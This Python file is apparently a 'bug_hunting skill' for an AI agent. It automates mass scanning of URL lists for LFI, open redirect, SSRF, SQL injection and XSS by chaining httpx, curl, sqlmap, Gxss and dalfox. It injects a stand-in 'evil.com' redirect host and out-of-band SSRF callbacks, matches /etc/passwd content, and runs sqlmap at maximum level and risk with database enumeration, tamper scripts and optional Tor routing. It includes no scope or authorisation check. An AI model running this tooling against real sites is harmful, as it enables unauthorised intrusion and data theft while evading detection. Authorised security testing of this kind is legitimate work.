#!/usr/bin/env python3
"""LFI, Open Redirect, SSRF, SQLi, and XSS hunting helpers for the bug_hunting skill.

Provides Python wrappers for the canonical one-liners from KB Expansion
Blocks 2, 3, and 5, with async OOB polling for SSRF confirmation.

Tools integrated (all flags validated via Context7):
* **httpx** – LFI probing (`-l`, `-threads`, `-mc`, `-mr`, `-follow-redirects`)
* **curl**  – open redirect confirmation (`-L -I`)
* **sqlmap** – SQL injection (`-m`, `--batch`, `--random-agent`, `--level`, `--risk`, `--tamper`)
* **Gxss**  – reflected parameter filtering (`-c`, `-p Xss`)
* **dalfox** – XSS scanning (`pipe` mode)
* **uro**   – URL deduplication/normalisation
* **gf**    – grep-wrapper pattern matching (lfi, xss, sqli, redirect, ssrf)
* **qsreplace** – query-string parameter value substitution

Usage
-----
::

    python vuln_oneliner.py lfi      --urls urls.txt --wordlist lfi_wordlist.txt
    python vuln_oneliner.py redirect --urls urls.txt
    python vuln_oneliner.py ssrf     --urls urls.txt --oob <interactsh_url>
    python vuln_oneliner.py sqli     --urls urls.txt
    python vuln_oneliner.py xss      --urls urls.txt
"""

from __future__ import annotations

import argparse
import asyncio
import logging
import os
import subprocess
import tempfile
from pathlib import Path
from typing import Iterator, List, Optional, Tuple

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------


def _run(
    cmd: List[str],
    *,
    timeout: int = 60,
    stdin: Optional[str] = None,
) -> Tuple[int, str, str]:
    """Run *cmd* and return (returncode, stdout, stderr)."""
    try:
        r = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            input=stdin,
        )
        return r.returncode, r.stdout or "", r.stderr or ""
    except FileNotFoundError as exc:
        return 127, "", f"Tool not found: {exc}"
    except subprocess.TimeoutExpired:
        return 124, "", "Timed out"


def _read_urls(path: str) -> List[str]:
    """Read URLs from a file, one per line, stripping blanks."""
    p = Path(path)
    if not p.exists():
        logger.warning("URL file not found: %s", path)
        return []
    return [l.strip() for l in p.read_text(encoding="utf-8").splitlines() if l.strip()]


def _write_tmp(lines: List[str]) -> str:
    """Write *lines* to a temporary file and return its path."""
    with tempfile.NamedTemporaryFile(
        mode="w", suffix=".txt", delete=False, encoding="utf-8"
    ) as tmp:
        tmp.write("\n".join(lines))
        return tmp.name


def _gf_filter(urls: List[str], pattern: str) -> List[str]:
    """Filter *urls* through ``gf <pattern>`` if gf is installed.

    Falls back to returning all parameterised URLs if gf is unavailable.
    Canonical: ``cat urls.txt | gf lfi``
    """
    if not urls:
        return []
    rc, stdout, _ = _run(["gf", pattern], stdin="\n".join(urls), timeout=30)
    if rc == 0 and stdout.strip():
        return [l.strip() for l in stdout.splitlines() if l.strip()]
    # Fallback: return URLs that contain a query parameter
    return [u for u in urls if "=" in u]


def _uro_deduplicate(urls: List[str]) -> List[str]:
    """Deduplicate and normalise URLs with ``uro`` if installed.

    Falls back to a simple dict-based dedup preserving insertion order.
    Canonical: ``cat urls.txt | uro``
    """
    if not urls:
        return []
    rc, stdout, _ = _run(["uro"], stdin="\n".join(urls), timeout=30)
    if rc == 0 and stdout.strip():
        return [l.strip() for l in stdout.splitlines() if l.strip()]
    return list(dict.fromkeys(urls))


def _qsreplace(urls: List[str], value: str) -> List[str]:
    """Replace every query-string parameter value with *value* via ``qsreplace``.

    Falls back to urllib.parse manipulation if qsreplace is not installed.
    Canonical: ``cat urls.txt | qsreplace 'FUZZ'``
    """
    if not urls:
        return []
    rc, stdout, _ = _run(["qsreplace", value], stdin="\n".join(urls), timeout=30)
    if rc == 0 and stdout.strip():
        return [l.strip() for l in stdout.splitlines() if l.strip()]
    # Pure-Python fallback
    import urllib.parse

    result = []
    for url in urls:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        for key in qs:
            qs[key] = [value]
        result.append(
            urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(qs, doseq=True))
            )
        )
    return result


# ---------------------------------------------------------------------------
# LFI scanner
# ---------------------------------------------------------------------------


def scan_lfi(
    urls: List[str],
    wordlist: Optional[str] = None,
    threads: int = 20,
) -> List[str]:
    """Probe URL parameters for LFI using httpx.

    Flags (Context7/httpx confirmed):
    * ``-l``               – read targets from file
    * ``-threads``         – concurrent workers
    * ``-random-agent``    – randomise User-Agent header
    * ``-status-code``     – display status code in output
    * ``-follow-redirects`` – follow HTTP redirects
    * ``-mc 200``          – match only 200 OK responses
    * ``-mr``              – match response body pattern (``root:[x*]:0:0:``)
    * ``-paths``           – path wordlist (LFI payloads)

    Returns a list of potentially vulnerable URLs.
    """
    # Use gf to pre-filter LFI-likely params; fall back to = check
    candidate_urls = _gf_filter(_uro_deduplicate(urls), "lfi")
    if not candidate_urls:
        logger.info("No parameterised URLs found for LFI scan.")
        return []

    cmd = [
        "httpx",
        "-silent",
        "-threads", str(threads),
        "-random-agent",
        "-status-code",
        "-follow-redirects",
        "-mc", "200",
        "-mr", "root:[x*]:0:0:",
    ]
    if wordlist:
        cmd += ["-paths", wordlist]

    tmp_path = _write_tmp(candidate_urls)
    try:
        cmd += ["-l", tmp_path]
        rc, stdout, _ = _run(cmd, timeout=120)
        return [l.strip() for l in stdout.splitlines() if l.strip()] if rc == 0 else []
    finally:
        os.unlink(tmp_path)


# ---------------------------------------------------------------------------
# Open Redirect scanner
# ---------------------------------------------------------------------------


def scan_open_redirect(urls: List[str], evil_url: str = "http://evil.com") -> List[str]:
    """Test URLs for open redirect by substituting redirect params.

    Uses gf with 'redirect' pattern to pre-filter candidates.
    Canonical: ``cat urls.txt | gf redirect | qsreplace 'http://evil.com' | ...``
    """
    candidates = _gf_filter(urls, "redirect")
    if not candidates:
        logger.info("No redirect parameter URLs found.")
        return []

    # Use qsreplace to inject evil_url; fall back to urllib.parse
    test_urls = _qsreplace(candidates, evil_url)

    vulnerable: List[str] = []
    for test_url in test_urls:
        rc, stdout, _ = _run(
            ["curl", "-s", "-L", "-I", "-o", "/dev/null", "-w", "%{url_effective}", test_url],
            timeout=15,
        )
        if rc == 0 and evil_url in stdout:
            logger.warning("Open redirect confirmed: %s", test_url)
            vulnerable.append(test_url)

    return vulnerable


# ---------------------------------------------------------------------------
# SSRF scanner (with async OOB polling)
# ---------------------------------------------------------------------------


async def _poll_oob(server: str, token: str, correlation_id: str) -> bool:
    """Minimal synchronous OOB poll wrapped in a coroutine."""
    import requests  # noqa: PLC0415

    headers = {"Authorization": f"Bearer {token}"}
    url = f"https://{server}/api/interactions?correlationId={correlation_id}"
    for _ in range(10):
        try:
            resp = requests.get(url, headers=headers, timeout=10)
            if resp.status_code == 200 and resp.json().get("data"):
                return True
        except Exception:  # noqa: BLE001
            pass
        await asyncio.sleep(5)
    return False


def scan_ssrf(
    urls: List[str],
    oob_server: str,
    oob_token: str = "",
    correlation_id: str = "ssrf-verify",
) -> List[str]:
    """Substitute OOB URLs into parameters and poll for callbacks.

    Uses qsreplace for injection; gf with 'ssrf' pattern for pre-filtering.
    Canonical: ``cat urls.txt | gf ssrf | qsreplace <oob_url> | httpx -silent -fr``
    """
    candidates = _gf_filter(urls, "ssrf")
    oob_payload = f"https://{correlation_id}.{oob_server}"
    test_urls = _qsreplace(candidates, oob_payload)
    if not test_urls:
        return []

    # Fire requests
    for t_url in test_urls:
        _run(["curl", "-s", t_url, "-m", "5"], timeout=10)

    # Poll OOB server
    confirmed = asyncio.run(_poll_oob(oob_server, oob_token, correlation_id))
    return test_urls if confirmed else []


# ---------------------------------------------------------------------------
# SQLi scanner
# ---------------------------------------------------------------------------


def scan_sqli(
    urls: List[str],
    tamper: Optional[str] = None,
    use_tor: bool = False,
    extra_flags: Optional[List[str]] = None,
) -> str:
    """Run sqlmap against parameterised URLs via ``-m <bulk-file>``.

    Flags (Context7/sqlmap confirmed):
    * ``-m``             – bulk file of target URLs
    * ``--batch``        – non-interactive (auto-answer prompts)
    * ``--random-agent`` – randomise User-Agent
    * ``--level 5``      – maximum injection point coverage
    * ``--risk 3``       – include OR-based payloads (use with care)
    * ``--dbs``          – enumerate databases on confirmed injection
    * ``--tamper``       – comma-separated tamper script(s)
    * ``--tor``          – route through Tor
    * ``--tor-type``     – SOCKS5 Tor proxy
    * ``--check-tor``    – verify Tor connectivity before scan
    * ``--delay``        – per-request delay (rate-limit compliance)

    Returns sqlmap's stdout (findings summary).
    """
    # Pre-filter with gf sqli pattern; fall back to = check
    candidates = _gf_filter(_uro_deduplicate(urls), "sqli")
    if not candidates:
        logger.info("No SQLi-candidate URLs found.")
        return ""

    tmp_path = _write_tmp(candidates)
    try:
        cmd = [
            "sqlmap",
            "-m", tmp_path,
            "--batch",
            "--random-agent",
            "--level", "5",
            "--risk", "3",
            "--dbs",
            "--delay", "2",
        ]
        if tamper:
            cmd += ["--tamper", tamper]
        if use_tor:
            cmd += ["--tor", "--tor-type=SOCKS5", "--check-tor"]
        if extra_flags:
            cmd.extend(extra_flags)

        rc, stdout, stderr = _run(cmd, timeout=600)
        if rc not in (0, 1):
            logger.warning("sqlmap exited with code %d: %s", rc, stderr[:120])
        return stdout
    finally:
        os.unlink(tmp_path)


# ---------------------------------------------------------------------------
# XSS scanner (Gxss → dalfox pipeline)
# ---------------------------------------------------------------------------


def scan_xss(urls: List[str], concurrency: int = 100) -> List[str]:
    """Reflected XSS hunting via Gxss → dalfox pipeline.

    Pipeline (Context7 / canonical KB Block 3):
    1. ``gf xss``    – filter URLs with reflection-likely parameters
    2. ``Gxss -c N -p Xss`` – identify URLs with reflected parameter values
    3. ``dalfox pipe`` – exploit/confirm reflected XSS on Gxss output

    Gxss flags:
    * ``-c``  – concurrency
    * ``-p Xss`` – payload marker string

    dalfox flags:
    * ``pipe``      – read targets from stdin
    * ``--silence`` – suppress verbose output

    Returns a list of confirmed XSS URLs from dalfox output.
    """
    # Step 1: gf pre-filter
    xss_candidates = _gf_filter(_uro_deduplicate(urls), "xss")
    if not xss_candidates:
        logger.info("No XSS-candidate URLs found.")
        return []

    # Step 2: Gxss – find reflected parameters
    rc, gxss_out, _ = _run(
        ["Gxss", "-c", str(concurrency), "-p", "Xss"],
        stdin="\n".join(xss_candidates),
        timeout=120,
    )
    if rc == 127:
        logger.warning("Gxss not installed; passing candidates directly to dalfox.")
        gxss_out = "\n".join(xss_candidates)
    elif rc != 0 or not gxss_out.strip():
        logger.info("Gxss found no reflected parameters.")
        return []

    # Step 3: dalfox pipe
    rc2, dalfox_out, _ = _run(
        ["dalfox", "pipe", "--silence"],
        stdin=gxss_out,
        timeout=300,
    )
    if rc2 == 127:
        logger.warning("dalfox not installed; returning Gxss output as candidates.")
        return [l.strip() for l in gxss_out.splitlines() if l.strip()]

    return [l.strip() for l in dalfox_out.splitlines() if l.strip()]


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def main() -> None:
    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")

    parser = argparse.ArgumentParser(
        description="Vuln one-liners: LFI / Redirect / SSRF / SQLi / XSS"
    )
    sub = parser.add_subparsers(dest="cmd", required=True)

    p_lfi = sub.add_parser("lfi", help="LFI scan")
    p_lfi.add_argument("--urls", required=True, help="Path to urls.txt")
    p_lfi.add_argument("--wordlist", default=None, help="LFI wordlist for httpx -paths")

    p_redir = sub.add_parser("redirect", help="Open redirect scan")
    p_redir.add_argument("--urls", required=True)
    p_redir.add_argument("--evil-url", default="http://evil.com")

    p_ssrf = sub.add_parser("ssrf", help="SSRF scan with OOB polling")
    p_ssrf.add_argument("--urls", required=True)
    p_ssrf.add_argument("--oob", required=True, help="interactsh server hostname")
    p_ssrf.add_argument("--token", default="")
    p_ssrf.add_argument("--id", default="ssrf-verify", dest="corr_id")

    p_sqli = sub.add_parser("sqli", help="SQLi scan via sqlmap")
    p_sqli.add_argument("--urls", required=True)
    p_sqli.add_argument("--tamper", default=None)
    p_sqli.add_argument("--tor", action="store_true")

    p_xss = sub.add_parser("xss", help="XSS scan via Gxss+dalfox")
    p_xss.add_argument("--urls", required=True)
    p_xss.add_argument("--concurrency", type=int, default=100)

    args = parser.parse_args()
    urls = _read_urls(args.urls)

    if args.cmd == "lfi":
        results = scan_lfi(urls, wordlist=getattr(args, "wordlist", None))
    elif args.cmd == "redirect":
        results = scan_open_redirect(urls, evil_url=args.evil_url)
    elif args.cmd == "ssrf":
        results = scan_ssrf(
            urls,
            oob_server=args.oob,
            oob_token=args.token,
            correlation_id=args.corr_id,
        )
    elif args.cmd == "sqli":
        output = scan_sqli(urls, tamper=args.tamper, use_tor=args.tor)
        print(output or "[-] No SQLi findings.")
        return
    else:  # xss
        results = scan_xss(urls, concurrency=args.concurrency)

    if results:
        print(f"[+] {len(results)} result(s):")
        for r in results:
            print(f"  {r}")
    else:
        print("[-] No results found.")


if __name__ == "__main__":
    main()
